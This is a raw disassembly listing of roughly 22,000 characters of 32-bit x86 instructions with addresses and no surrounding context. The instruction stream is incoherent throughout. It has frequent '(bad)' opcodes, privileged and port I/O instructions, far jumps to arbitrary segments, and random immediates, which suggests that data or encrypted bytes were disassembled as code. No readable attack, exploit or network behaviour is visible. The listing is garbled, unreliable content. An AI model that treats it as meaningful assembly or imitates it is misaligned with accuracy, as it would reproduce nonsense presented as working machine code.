  412b66:	sbb    DWORD PTR [ecx+0x31],edi
  412b69:	ja     0x412b60
  412b6b:	dec    edx
  412b6c:	cvtps2pi mm7,xmm2
  412b6f:	jmp    0x1f3e:0x973c36f2
  412b76:	push   esp
  412b77:	and    esp,DWORD PTR [eax+edx*1-0x10f77050]
  412b7e:	pop    edx
  412b7f:	repnz xor BYTE PTR [edx],bl
  412b82:	push   eax
  412b83:	cmp    ch,BYTE PTR [ebx-0x66534ac5]
  412b89:	bnd ja 0x412bed
  412b8c:	push   edi
  412b8d:	mov    dl,0xb2
  412b8f:	loope  0x412b3c
  412b91:	sub    al,0xfb
  412b93:	or     DWORD PTR [esp+ebx*1],ebx
  412b96:	sbb    BYTE PTR [eax],bh
  412b98:	les    edx,FWORD PTR [edi-0x4d]
  412b9b:	repnz mov gs,ebp
  412b9e:	fst    QWORD PTR [esi]
  412ba0:	mov    ch,0x1d
  412ba2:	lahf   
  412ba3:	cs aas 
  412ba5:	cmp    BYTE PTR [esi+0xacf9c3b],0xae
  412bac:	lock dec esi
  412bae:	enter  0x77ac,0xb5
  412bb2:	add    edi,DWORD PTR cs:[esi]
  412bb5:	int    0xd2
  412bb7:	jns    0x412bf3
  412bb9:	hlt    
  412bba:	test   eax,0xdf910d84
  412bbf:	ja     0x412b68
  412bc1:	or     ch,BYTE PTR ds:0xa922cb12
  412bc7:	mov    ds:0xdf581e4c,eax
  412bcd:	sub    eax,ebx
  412bcf:	xchg   edx,eax
  412bd0:	add    al,0x59
  412bd2:	inc    ecx
  412bd3:	loopne 0x412b9f
  412bd5:	sub    BYTE PTR [edx+0x6b363dad],bh
  412bdb:	jae    0x412b7a
  412bdd:	pop    esi
  412bde:	or     al,0x85
  412be0:	add    al,cl
  412be2:	jmp    0x412c1c
  412be4:	std    
  412be5:	push   0xf926c207
  412bea:	mov    ebp,cs
  412bec:	mov    ecx,0xf1fffd13
  412bf1:	fisttp DWORD PTR [edi-0x3c749809]
  412bf7:	cmp    BYTE PTR [eax],dh
  412bf9:	xchg   ecx,eax
  412bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bfb:	mov    bl,0x35
  412bfd:	pop    ecx
  412bfe:	xchg   edx,eax
  412bff:	addr16 inc esp
  412c01:	scas   al,BYTE PTR es:[edi]
  412c02:	push   ds
  412c03:	das    
  412c04:	aas    
  412c05:	int    0x3f
  412c07:	int3   
  412c08:	cmp    dl,bh
  412c0a:	(bad)  
  412c0c:	cmp    esp,DWORD PTR [ebx+ecx*2]
  412c0f:	add    BYTE PTR [eax+0x4c],ch
  412c12:	jge    0x412be6
  412c14:	hlt    
  412c15:	out    0x9f,al
  412c17:	std    
  412c18:	fbstp  TBYTE PTR [ecx+0x3b947669]
  412c1e:	jecxz  0x412c10
  412c20:	loop   0x412ba5
  412c22:	(bad)
  412c25:	stos   BYTE PTR es:[edi],al
  412c26:	cld    
  412c27:	mov    al,ds:0x855273e3
  412c2c:	lods   eax,DWORD PTR ds:[esi]
  412c2d:	in     eax,dx
  412c2e:	dec    ecx
  412c2f:	and    eax,0xa2d7dbfc
  412c34:	and    eax,0x87fd5a31
  412c39:	pop    ecx
  412c3a:	fnstsw WORD PTR [ecx+esi*8+0x9]
  412c3e:	(bad)  
  412c3f:	jns    0x412c04
  412c41:	adc    eax,0x764be960
  412c46:	repnz fst DWORD PTR [ebx+0x6f]
  412c4a:	xchg   ecx,eax
  412c4b:	out    dx,al
  412c4c:	mov    BYTE PTR [esi+edx*4],cl
  412c4f:	xchg   edx,eax
  412c50:	mov    cl,0xe1
  412c52:	and    bh,cl
  412c54:	imul   esi
  412c56:	outs   dx,DWORD PTR ds:[esi]
  412c57:	or     DWORD PTR [edx+0x20],esi
  412c5a:	cld    
  412c5b:	cmp    esp,DWORD PTR [ebp-0x54]
  412c5e:	jmp    0xa4f:0xcac5439e
  412c65:	sar    DWORD PTR [ebx-0x78],0xf1
  412c69:	push   edi
  412c6a:	hlt    
  412c6b:	mov    al,0x7e
  412c6d:	xchg   edx,eax
  412c6e:	inc    ecx
  412c6f:	push   edi
  412c70:	scas   eax,DWORD PTR es:[edi]
  412c71:	mov    WORD PTR [edi+0x53],es
  412c74:	xchg   BYTE PTR [esi-0xd],al
  412c77:	pop    ecx
  412c78:	sar    BYTE PTR [esp+esi*1-0x58],1
  412c7c:	rol    edi,1
  412c7e:	xor    al,0x56
  412c80:	imul   bx,WORD PTR [edx+0x50],0x32
  412c85:	cs push esp
  412c87:	mov    ecx,0x7b394eb3
  412c8c:	int    0x9d
  412c8e:	lds    esi,FWORD PTR [eax]
  412c90:	pushf  
  412c91:	in     eax,dx
  412c92:	dec    ebp
  412c93:	add    DWORD PTR [ebx],edx
  412c95:	push   0xa4800ceb
  412c9a:	sub    DWORD PTR es:[ecx-0x37c127c6],edi
  412ca1:	inc    esp
  412ca2:	sbb    ebx,esp
  412ca4:	nop
  412ca5:	stos   BYTE PTR es:[edi],al
  412ca6:	outs   dx,BYTE PTR ds:[esi]
  412ca7:	lahf   
  412ca8:	and    eax,0xe9483ef6
  412cad:	or     eax,0x3c556ec6
  412cb2:	mov    ah,0x28
  412cb4:	jae    0x412c67
  412cb6:	iret   
  412cb7:	mov    eax,0xa32eb2b
  412cbc:	mov    al,ds:0xedccb8a4
  412cc1:	sbb    esp,DWORD PTR [eax]
  412cc3:	pop    esi
  412cc4:	ror    BYTE PTR [ecx],0x66
  412cc7:	les    esp,FWORD PTR [eax]
  412cc9:	sti    
  412cca:	mov    edx,0x5cf2498c
  412ccf:	sbb    BYTE PTR [esi+0x720532f6],bh
  412cd5:	pusha  
  412cd6:	aad    0xa6
  412cd8:	sub    dh,BYTE PTR [esi-0x18]
  412cdb:	xchg   esi,eax
  412cdc:	sub    al,0x9a
  412cde:	icebp  
  412cdf:	cld    
  412ce0:	(bad)  
  412ce1:	out    dx,eax
  412ce2:	ins    BYTE PTR es:[edi],dx
  412ce3:	or     edi,ebx
  412ce5:	pop    ebx
  412ce6:	push   ebp
  412ce7:	retf   0xa3f9
  412cea:	push   esp
  412ceb:	aam    0x53
  412ced:	scas   eax,DWORD PTR es:[edi]
  412cee:	mov    edi,0x8ffd985f
  412cf3:	leave  
  412cf4:	inc    eax
  412cf5:	ret    0x4dfd
  412cf8:	mul    DWORD PTR [eax+eax*2-0x7318abbd]
  412cff:	dec    ebp
  412d00:	jbe    0x412d21
  412d02:	mov    esi,0x94a11cc
  412d07:	sti    
  412d08:	fistp  WORD PTR [esi+0x28]
  412d0b:	add    al,0x1b
  412d0d:	adc    BYTE PTR [edi-0x3dd8e347],al
  412d13:	data16 add al,0xc8
  412d16:	or     cl,cl
  412d18:	fistp  QWORD PTR [ebx-0x5a]
  412d1b:	mov    esi,0x2157bb4e
  412d20:	xchg   edx,eax
  412d21:	pop    ecx
  412d22:	retf   0xb3d7
  412d25:	lea    esi,[ecx+0x2487f1df]
  412d2b:	or     BYTE PTR [ebp-0x16],cl
  412d2e:	in     al,dx
  412d2f:	jbe    0x412dad
  412d31:	les    ebp,FWORD PTR [eax-0x40]
  412d34:	and    eax,DWORD PTR [ebp+0x39]
  412d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d38:	inc    esp
  412d39:	mov    bh,0x35
  412d3b:	out    dx,eax
  412d3c:	das    
  412d3d:	xchg   edi,eax
  412d3e:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d40:	adc    ebx,DWORD PTR [ebp-0x77]
  412d43:	dec    edx
  412d44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d45:	jmp    0x7ec3:0x77851f48
  412d4c:	xchg   ebx,eax
  412d4d:	outs   dx,BYTE PTR ds:[esi]
  412d4e:	pop    eax
  412d4f:	xor    bl,dl
  412d51:	cmp    al,BYTE PTR [edx+ebx*4]
  412d54:	xchg   edi,eax
  412d55:	lods   al,BYTE PTR ds:[esi]
  412d56:	sub    al,0x8
  412d58:	bound  edi,QWORD PTR [edx-0x34dc6c2e]
  412d5e:	popf   
  412d5f:	dec    esi
  412d60:	sbb    eax,0x5c8e857a
  412d65:	mov    al,0xaa
  412d67:	inc    esp
  412d68:	es push ds
  412d6a:	retf   0xfa57
  412d6d:	xchg   ebp,eax
  412d6e:	into   
  412d6f:	or     bl,BYTE PTR [ebx-0x5f43c6db]
  412d75:	out    dx,al
  412d76:	lahf   
  412d77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d78:	mov    al,ds:0xad77498
  412d7d:	mov    ebp,0xd05eaf63
  412d82:	test   al,0x26
  412d84:	push   edi
  412d85:	(bad)  
  412d86:	jbe    0x412d53
  412d88:	sub    eax,0xcafc032a
  412d8d:	in     al,0x81
  412d8f:	dec    ebp
  412d90:	js     0x412d23
  412d92:	sbb    eax,0x2ab772fe
  412d97:	bnd jbe 0x412da4
  412d9a:	pop    ss
  412d9b:	sub    ebp,DWORD PTR ds:0xd2882681
  412da1:	ret    0xb34
  412da4:	fnsave [edi]
  412da6:	sbb    edx,DWORD PTR [esi]
  412da8:	inc    ebp
  412da9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412daa:	mov    edi,0x86c68b08
  412daf:	mov    ss,WORD PTR [edi+ecx*4]
  412db2:	push   esp
  412db3:	pop    esp
  412db4:	aaa    
  412db5:	dec    ecx
  412db6:	sub    DWORD PTR [edi],edx
  412db8:	sti    
  412db9:	inc    eax
  412dba:	aam    0xe5
  412dbc:	push   edi
  412dbd:	mov    eax,0xd1c40a7a
  412dc2:	mov    dl,0x2a
  412dc4:	test   BYTE PTR [ecx+0x7f],bl
  412dc7:	jbe    0x412e41
  412dc9:	jmp    0x412e2a
  412dcb:	dec    esi
  412dcc:	pop    esi
  412dcd:	test   BYTE PTR [edx],0x80
  412dd0:	jb     0x412db1
  412dd2:	das    
  412dd3:	cwde   
  412dd4:	in     eax,dx
  412dd5:	pop    esp
  412dd6:	adc    eax,0xde874969
  412ddb:	pop    esi
  412ddc:	push   es
  412ddd:	mov    ebx,0x96c97d24
  412de2:	sbb    DWORD PTR [eax-0x3829dacc],edi
  412de8:	mul    esi
  412dea:	loop   0x412d81
  412dec:	or     eax,esi
  412dee:	or     DWORD PTR [esi+edi*8+0x16],edx
  412df2:	cmc    
  412df3:	sub    bl,ch
  412df5:	mov    dh,0x16
  412df7:	retf   
  412df8:	test   eax,0xc1e85d51
  412dfd:	xchg   edi,eax
  412dfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dff:	aad    0x6f
  412e01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e02:	mov    bl,0xa8
  412e04:	rol    ebx,cl
  412e06:	scas   al,BYTE PTR es:[edi]
  412e07:	cmp    edx,DWORD PTR [edi+0x34]
  412e0a:	pop    esi
  412e0b:	xor    cl,ah
  412e0d:	fabs   
  412e0f:	popf   
  412e10:	test   eax,0x8f5d92da
  412e15:	rol    ah,1
  412e17:	int3   
  412e18:	mov    esp,0x293efee9
  412e1d:	cli    
  412e1e:	or     BYTE PTR [edi-0x5aace98a],0xc2
  412e25:	jmp    0x522c1f7
  412e2a:	(bad)  
  412e2b:	repz call 0x997a7a4c
  412e31:	imul   esp,DWORD PTR [ebx+0x70],0x4d161ad6
  412e38:	mov    edi,0xb3255efd
  412e3d:	data16 ror ah,0x34
  412e41:	mov    cl,BYTE PTR fs:[ecx-0x1e]
  412e45:	gs push ebp
  412e47:	mov    al,0x74
  412e49:	mov    ecx,0x95e0791
  412e4e:	ins    DWORD PTR es:[edi],dx
  412e4f:	push   cs
  412e50:	pusha  
  412e51:	popf   
  412e52:	dec    edi
  412e53:	call   0xd6a2eacc
  412e58:	adc    esp,DWORD PTR [edi]
  412e5a:	cwde   
  412e5b:	add    DWORD PTR [eax-0x3906f644],edi
  412e61:	rcl    DWORD PTR [ebx+0xe4dcbd4],cl
  412e67:	scas   eax,DWORD PTR es:[edi]
  412e68:	xlat   BYTE PTR ds:[ebx]
  412e69:	jb     0x412eb3
  412e6b:	stc    
  412e6c:	or     esi,DWORD PTR [ebp+0x41]
  412e6f:	sub    al,0x48
  412e71:	call   0xbb8e:0xb7664b24
  412e78:	sbb    dl,dl
  412e7a:	xor    DWORD PTR [eax+0x11],ebp
  412e7d:	(bad)  
  412e7e:	dec    eax
  412e7f:	scas   al,BYTE PTR es:[di]
  412e81:	shl    DWORD PTR [esi+ebp*8-0x1a865fec],1
  412e88:	mov    bl,ch
  412e8a:	nop
  412e8b:	mov    ah,0xa3
  412e8d:	dec    ecx
  412e8e:	call   0xc8f0:0xecfb3273
  412e95:	fsubrp st(1),st
  412e97:	sar    BYTE PTR [ebp+ebx*8+0x71],cl
  412e9b:	outs   dx,BYTE PTR ds:[esi]
  412e9c:	(bad)  
  412e9d:	jmp    ebp
  412e9f:	cli    
  412ea0:	xchg   BYTE PTR [esi-0x7d],ah
  412ea3:	push   si
  412ea5:	sbb    eax,0xb67d87a4
  412eaa:	leave  
  412eab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eac:	cmp    eax,0x19105c63
  412eb1:	xor    al,0xa2
  412eb3:	sbb    esp,DWORD PTR [edx-0x31]
  412eb6:	mov    bl,0xbe
  412eb8:	push   0x7b0fba8f
  412ebd:	rol    DWORD PTR [edi-0x7ea17675],cl
  412ec3:	mov    ch,0xa1
  412ec5:	test   BYTE PTR [ebx],dh
  412ec7:	loope  0x412eeb
  412ec9:	inc    esp
  412eca:	fnstenv [ebp+0x81ba293]
  412ed0:	pushf  
  412ed1:	sti    
  412ed2:	out    0xc2,eax
  412ed4:	push   eax
  412ed5:	imul   edx,DWORD PTR [esi],0x4b
  412ed8:	js     0x412ee2
  412eda:	inc    edx
  412edb:	cdq    
  412edc:	stc    
  412edd:	jno    0x412f50
  412edf:	mov    ch,0x48
  412ee1:	mov    eax,ds:0x949ca05d
  412ee6:	and    BYTE PTR [ecx],0xb7
  412ee9:	xchg   ecx,eax
  412eea:	inc    esi
  412eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eec:	sbb    esi,DWORD PTR [ecx+0x1cb5b6eb]
  412ef2:	retf   
  412ef3:	lahf   
  412ef4:	inc    ecx
  412ef5:	ror    bl,1
  412ef7:	test   ebp,esi
  412ef9:	and    DWORD PTR [edx],esp
  412efb:	push   eax
  412efc:	xor    DWORD PTR [ebp-0x6f148ab1],ecx
  412f02:	add    eax,DWORD PTR [esp+esi*4]
  412f05:	xor    al,0xfe
  412f07:	sbb    eax,DWORD PTR [ecx-0x5d]
  412f0a:	cmp    eax,0xe43780bd
  412f0f:	js     0x412f84
  412f11:	push   edi
  412f12:	xchg   edx,eax
  412f13:	dec    edi
  412f14:	stc    
  412f15:	cmp    al,0xcd
  412f17:	retf   0x582b
  412f1a:	es mov eax,0x4c97d1ff
  412f20:	xor    dl,bl
  412f22:	inc    esp
  412f23:	pop    ebp
  412f24:	inc    esi
  412f25:	call   0x813c07f
  412f2a:	or     DWORD PTR [ecx-0x5611e291],0x4f6586a2
  412f34:	pusha  
  412f35:	icebp  
  412f36:	inc    esp
  412f37:	dec    esp
  412f38:	or     edx,DWORD PTR [ebp+0x41]
  412f3b:	mov    ebx,DWORD PTR ds:0xc3360012
  412f41:	and    BYTE PTR [ebx-0x9562cd],bh
  412f47:	aad    0xc5
  412f49:	outs   dx,BYTE PTR ds:[esi]
  412f4a:	hlt    
  412f4b:	jg     0x412f45
  412f4d:	inc    ecx
  412f4e:	jbe    0x412f11
  412f50:	sub    al,0x27
  412f52:	or     al,0x8e
  412f54:	adc    eax,ebx
  412f56:	jmp    0x6b88:0xdbf4fe17
  412f5d:	in     eax,0x43
  412f5f:	add    BYTE PTR [ecx+0x6d],dl
  412f62:	mov    al,0x1e
  412f64:	mov    ebp,0x2cd98728
  412f69:	les    ecx,FWORD PTR [edx-0x757562ed]
  412f6f:	mov    ebx,0x693b2b44
  412f74:	add    bh,0x64
  412f77:	xchg   esp,eax
  412f78:	(bad)  ds:0x7c3d7257
  412f7e:	add    BYTE PTR [ecx+0x2678a5bb],dh
  412f84:	jmp    0xc00a:0x629e2995
  412f8b:	call   0xe501da9
  412f90:	xor    al,0xe3
  412f92:	les    edx,FWORD PTR [ebp+0x3a]
  412f95:	int    0x14
  412f97:	sbb    ah,0xc
  412f9a:	mov    BYTE PTR [eax+0x3d7b5267],bh
  412fa0:	mov    edx,0x201186fb
  412fa5:	adc    BYTE PTR [ebx+0xc6e18b7],bl
  412fab:	jmp    0x4d:0x6515c565
  412fb2:	mov    ecx,0x81ff4c04
  412fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fb8:	repz push ebx
  412fba:	push   ss
  412fbb:	inc    ecx
  412fbc:	add    DWORD PTR [edx],esi
  412fbe:	int3   
  412fbf:	pop    esp
  412fc0:	jecxz  0x412f49
  412fc2:	fsubr  DWORD PTR [esi+0x69e1d0e4]
  412fc8:	fnstsw WORD PTR [esi]
  412fca:	and    DWORD PTR [ebx-0x2826b87],edi
  412fd0:	loopne 0x41302c
  412fd2:	cmp    esi,eax
  412fd4:	add    al,0x99
  412fd6:	fs scas eax,DWORD PTR es:[edi]
  412fd8:	push   ebx
  412fd9:	sub    al,0xb6
  412fdb:	and    al,0x3f
  412fdd:	dec    DWORD PTR [eax]
  412fdf:	les    edx,FWORD PTR [ebx-0x1500ec70]
  412fe5:	jg     0x413041
  412fe7:	int3   
  412fe8:	sbb    ecx,DWORD PTR [edx+0x48828634]
  412fee:	push   ds
  412fef:	test   BYTE PTR [edx+0x6294244d],bh
  412ff5:	push   edx
  412ff6:	int    0x8e
  412ff8:	xor    DWORD PTR [edi-0x6],ecx
  412ffb:	repnz sub BYTE PTR ds:0x9526adf4,al
  413002:	jbe    0x412fe1
  413004:	aas    
  413005:	adc    BYTE PTR [edx+0x7],cl
  413008:	fst    DWORD PTR [edi-0x2f]
  41300b:	lods   al,BYTE PTR ds:[esi]
  41300c:	(bad)  
  41300e:	dec    esp
  41300f:	jl     0x412fee
  413011:	clc    
  413012:	adc    BYTE PTR [eax-0x4708f6db],dl
  413018:	ja     0x412fc9
  41301a:	leave  
  41301b:	inc    edx
  41301c:	sub    dl,BYTE PTR [ecx]
  41301e:	lahf   
  41301f:	data16 xor al,0xaa
  413022:	xchg   esp,eax
  413023:	cdq    
  413024:	popa   
  413025:	push   ss
  413026:	mov    edx,0xee47fae5
  41302b:	or     BYTE PTR [edx+ebx*1+0x48],ch
  41302f:	into   
  413030:	and    ch,BYTE PTR [ecx+eax*8-0x139b0c89]
  413037:	sub    BYTE PTR [ecx-0x63cc3242],cl
  41303d:	pop    esp
  41303e:	xor    BYTE PTR ds:0xe45af39d,al
  413044:	pusha  
  413045:	test   DWORD PTR [bp+0x6d],ecx
  413049:	inc    edx
  41304a:	ror    BYTE PTR [ecx+0x68874ddf],0x6f
  413051:	jne    0x412fd9
  413053:	hlt    
  413054:	dec    esi
  413055:	ja     0x413098
  413057:	adc    esp,DWORD PTR [eax+0x74]
  41305a:	arpl   WORD PTR [edx+ecx*1+0x716119f2],dx
  413061:	jbe    0x41308c
  413063:	sub    al,0x64
  413065:	inc    eax
  413066:	mov    BYTE PTR [edx],ah
  413068:	push   0xc0fed7b
  41306d:	fdivp  st(6),st
  41306f:	rcr    DWORD PTR [ebx],cl
  413071:	fstp   TBYTE PTR [edi]
  413073:	mov    eax,ds:0x90b671c4
  413078:	in     eax,0xf0
  41307a:	pop    ebp
  41307b:	push   0x1d1055bd
  413080:	les    eax,FWORD PTR [ecx-0xa879f7c]
  413086:	sbb    al,0xf3
  413088:	xchg   esi,eax
  413089:	les    ebx,FWORD PTR [edx]
  41308b:	imul   esp,DWORD PTR [edi],0xffffff85
  41308e:	and    al,0xb7
  413090:	xor    BYTE PTR [ecx-0x1a],dh
  413093:	xor    al,al
  413095:	jne    0x4130cb
  413097:	aaa    
  413098:	icebp  
  413099:	pop    eax
  41309a:	cmp    DWORD PTR [edx],0xc36348b9
  4130a0:	dec    ecx
  4130a1:	stos   DWORD PTR es:[edi],eax
  4130a2:	into   
  4130a3:	add    al,0x70
  4130a5:	push   edi
  4130a6:	sar    BYTE PTR [ecx-0x62],1
  4130a9:	xchg   esi,eax
  4130aa:	fisub  WORD PTR [edi-0x5a]
  4130ad:	cmp    BYTE PTR [ebx],al
  4130af:	sbb    BYTE PTR [ecx],dl
  4130b1:	dec    ecx
  4130b2:	and    BYTE PTR [edi-0x25],bl
  4130b5:	cmp    BYTE PTR [edx-0x3d],al
  4130b8:	mov    esi,0x99ebcc2b
  4130bd:	frstor gs:[ebx]
  4130c0:	xlat   BYTE PTR ds:[ebx]
  4130c1:	(bad)  
  4130c2:	adc    al,0x2a
  4130c4:	push   edi
  4130c5:	xchg   edx,eax
  4130c6:	cmp    eax,0xc1c64153
  4130cb:	pop    edx
  4130cc:	sbb    bh,ch
  4130ce:	dec    DWORD PTR ds:0xa0ddca65
  4130d4:	push   edi
  4130d5:	add    DWORD PTR [ebx],eax
  4130d7:	repnz or al,0xaf
  4130da:	or     al,0x27
  4130dc:	xchg   esi,eax
  4130dd:	add    bh,BYTE PTR [edi-0x3f]
  4130e0:	std    
  4130e1:	leave  
  4130e2:	cmp    al,0xcb
  4130e4:	jo     0x41306c
  4130e6:	fs sbb eax,0xd3f5cf5a
  4130ec:	(bad)  
  4130ed:	xor    al,0x4c
  4130ef:	or     BYTE PTR [eax+0x27c5e3b8],dl
  4130f5:	out    0x83,al
  4130f7:	lock pxor mm3,QWORD PTR [edi+esi*8-0x47]
  4130fd:	xor    DWORD PTR [ebx-0x102c8a10],edi
  413103:	lods   eax,DWORD PTR ds:[esi]
  413104:	inc    edx
  413105:	add    ch,BYTE PTR es:[edx+esi*8+0x1d]
  41310a:	retf   
  41310b:	cmp    ch,ch
  41310d:	adc    ah,0x50
  413110:	sbb    eax,0xe31d0dc1
  413115:	or     bh,cl
  413117:	in     eax,0xa0
  413119:	rcr    BYTE PTR [edx+edi*4+0x49b097b],1
  413120:	ret    
  413121:	int3   
  413122:	pusha  
  413123:	(bad)  
  413124:	in     al,0x7a
  413126:	fld    st(2)
  413128:	add    dl,BYTE PTR [ecx]
  41312a:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41312c:	outs   dx,DWORD PTR ds:[esi]
  41312d:	pop    ds
  41312e:	pop    edx
  41312f:	jg     0x4130e0
  413131:	scas   al,BYTE PTR es:[edi]
  413132:	add    esi,edi
  413134:	int3   
  413135:	pop    ecx
  413136:	icebp  
  413137:	push   ebp
  413138:	pop    ds
  413139:	fcom   QWORD PTR [edi-0xe]
  41313c:	(bad)  
  41313e:	inc    ebx
  41313f:	mov    ds:0x1bfce7b8,al
  413144:	mov    DWORD PTR [edx+esi*2-0x28078e64],edi
  41314b:	and    ebp,esp
  41314d:	add    DWORD PTR [esi+0x2b2dfa20],eax
  413153:	xchg   edx,eax
  413154:	fstp   TBYTE PTR [ebx]
  413156:	aaa    
  413157:	test   DWORD PTR [ebx-0x74],edx
  41315a:	mov    ecx,0x48a85b09
  41315f:	cmp    eax,0x21435b99
  413164:	ror    BYTE PTR [edx],1
  413166:	push   ecx
  413167:	mov    cl,0x3
  413169:	icebp  
  41316a:	xchg   DWORD PTR [esi-0x2a],esp
  41316d:	aam    0x3e
  41316f:	xchg   ecx,eax
  413170:	and    DWORD PTR [ebx+ebx*1],0x6d57b322
  413177:	add    esi,DWORD PTR [edi+0x2c2060b8]
  41317d:	push   esp
  41317e:	dec    ebp
  41317f:	repz in eax,0xa8
  413182:	fwait
  413183:	pcmpeqb mm6,QWORD PTR gs:[edi-0x51]
  413188:	xchg   esi,eax
  413189:	sub    eax,0x86d69870
  41318e:	push   0x8
  413190:	fimul  WORD PTR [edi+0x24]
  413193:	push   es
  413194:	pop    edi
  413195:	push   ebx
  413196:	sub    al,0xab
  413198:	and    DWORD PTR [ecx+0x73],ebp
  41319b:	ins    BYTE PTR es:[edi],dx
  41319c:	icebp  
  41319d:	xchg   ebx,eax
  41319e:	cld    
  41319f:	and    al,0xa7
  4131a1:	cld    
  4131a2:	not    BYTE PTR [edx+0x75127756]
  4131a8:	gs pop ss
  4131aa:	inc    ecx
  4131ab:	pushf  
  4131ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ad:	js     0x4131df
  4131af:	ret    
  4131b0:	push   cs
  4131b1:	mov    eax,0xc694c048
  4131b6:	mov    dl,0xfc
  4131b8:	dec    eax
  4131b9:	sbb    edi,DWORD PTR [ecx-0x28]
  4131bc:	dec    ecx
  4131bd:	icebp  
  4131be:	jne    0x41315a
  4131c0:	mov    esi,0x3bf2b1f7
  4131c5:	(bad)  
  4131c6:	dec    ebp
  4131c7:	mov    edi,ecx
  4131c9:	cmp    dh,ah
  4131cb:	jbe    0x413151
  4131cd:	es push esi
  4131cf:	jmp    0x9007:0x283bd11f
  4131d6:	pop    ds
  4131d7:	cld    
  4131d8:	repnz popf 
  4131da:	xor    al,0xc4
  4131dc:	xchg   DWORD PTR [ebx+0x61f41e53],eax
  4131e2:	add    eax,0xe238de4b
  4131e7:	jae    0x41321c
  4131e9:	fidiv  DWORD PTR [esi]
  4131eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ec:	or     DWORD PTR [edi-0xa],ebx
  4131ef:	cmc    
  4131f0:	(bad)  
  4131f1:	cdq    
  4131f2:	shl    dl,0xff
  4131f5:	sbb    DWORD PTR [edi-0x5c27f53a],eax
  4131fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131fc:	adc    DWORD PTR [edx],0x4258a89b
  413202:	xor    ebp,DWORD PTR [ebp+0x2f5444e6]
  413208:	mov    bl,0x7b
  41320a:	call   0x7ffdca22
  41320f:	pop    ebx
  413210:	and    DWORD PTR [esi-0x61eedd9],edi
  413216:	sti    
  413217:	mov    dh,0xd4
  413219:	push   esi
  41321a:	inc    ebx
  41321b:	sub    DWORD PTR [edi-0x5e],0xffffff8e
  41321f:	mov    eax,0xbe37cb5
  413224:	pop    ebx
  413225:	(bad)  
  413227:	cs inc esi
  413229:	mov    esi,0xe9c2e498
  41322e:	lods   eax,DWORD PTR ds:[esi]
  41322f:	imul   ebx,esp,0x37
  413232:	mov    dh,0x16
  413234:	arpl   di,ax
  413236:	sbb    esi,DWORD PTR [ebx-0x68]
  413239:	or     eax,0x1367cba5
  41323e:	or     BYTE PTR [eax+0x7c062f80],al
  413244:	jl     0xcf9433dd
  41324a:	mov    cs,ebp
  41324c:	leave  
  41324d:	in     eax,0x5e
  41324f:	pop    edx
  413250:	fdivr  QWORD PTR [esp+eiz*4]
  413253:	pop    es
  413254:	xchg   ebp,eax
  413255:	and    ebx,DWORD PTR [esi+0x4d]
  413258:	mov    ds:0xec137f7a,eax
  41325d:	neg    bh
  41325f:	xor    al,0x5a
  413261:	rcl    BYTE PTR [esi-0x59ea04be],0x45
  413268:	fwait
  413269:	stos   DWORD PTR es:[edi],eax
  41326a:	dec    ecx
  41326b:	add    al,0x59
  41326d:	mov    WORD PTR [edi+0x50],?
  413270:	loop   0x41327e
  413272:	mov    bh,0x5e
  413274:	les    eax,FWORD PTR [edi+ebx*1]
  413277:	push   es
  413278:	out    0x25,eax
  41327a:	ss mov edi,0xa063ac67
  413280:	xor    dl,BYTE PTR [edx-0x3a]
  413283:	xchg   esi,eax
  413284:	jb     0x413256
  413286:	mov    esi,0x9321e86a
  41328b:	setg   dl
  41328e:	mov    ds:0x2e798548,eax
  413293:	sbb    edx,eax
  413295:	xchg   edi,eax
  413296:	pop    eax
  413297:	fild   DWORD PTR [eax]
  413299:	std    
  41329a:	cmp    edi,DWORD PTR [ebx-0x58]
  41329d:	sub    DWORD PTR [ecx+0x72],0x24
  4132a1:	fcmovnu st,st(1)
  4132a3:	mov    cl,0x39
  4132a5:	xchg   esi,eax
  4132a6:	mov    eax,0x60d2b589
  4132ab:	mov    cs,esi
  4132ad:	inc    eax
  4132ae:	inc    esp
  4132af:	adc    edi,eax
  4132b1:	cmp    ch,BYTE PTR [edi]
  4132b3:	or     BYTE PTR [ebx+0x5efe8207],bl
  4132b9:	enter  0xd88,0xe9
  4132bd:	mov    ebp,0xece76975
  4132c2:	sub    edx,esp
  4132c4:	lock inc ebx
  4132c6:	rcl    BYTE PTR [eax+0x2b],0xd5
  4132ca:	cmp    al,0x1b
  4132cc:	aad    0x22
  4132ce:	or     eax,0x7d6e7e3d
  4132d3:	sub    ah,bh
  4132d5:	and    edx,DWORD PTR [esi+0x46]
  4132d8:	fimul  DWORD PTR [eax-0x4fba3c0e]
  4132de:	xchg   BYTE PTR [ecx],dh
  4132e0:	shl    DWORD PTR [eax-0x6],1
  4132e3:	cli    
  4132e4:	sbb    al,BYTE PTR [ecx]
  4132e6:	cmp    al,BYTE PTR [esi+0x26]
  4132e9:	enter  0xadfd,0xf1
  4132ed:	mov    dh,0xe
  4132ef:	cs dec edx
  4132f1:	cdq    
  4132f2:	jbe    0x413292
  4132f4:	nop
  4132f5:	gs into 
  4132f7:	arpl   WORD PTR [ecx-0x4d],di
  4132fa:	xor    DWORD PTR [ebp+edx*4-0x1413e5ac],edx
  413301:	pop    edi
  413302:	xchg   edx,eax
  413303:	xlat   BYTE PTR ds:[ebx]
  413304:	mov    eax,cs
  413306:	std    
  413307:	xchg   DWORD PTR [ebp-0x15],ecx
  41330a:	or     ebp,DWORD PTR [esi+0x53ef312a]
  413310:	xor    al,ch
  413312:	stc    
  413313:	lods   al,BYTE PTR ds:[esi]
  413314:	fcom   QWORD PTR [esi+0x3b]
  413317:	lahf   
  413318:	adc    eax,0xc508a2c0
  41331d:	(bad)  
  41331e:	int3   
  41331f:	mov    eax,ds:0x340052
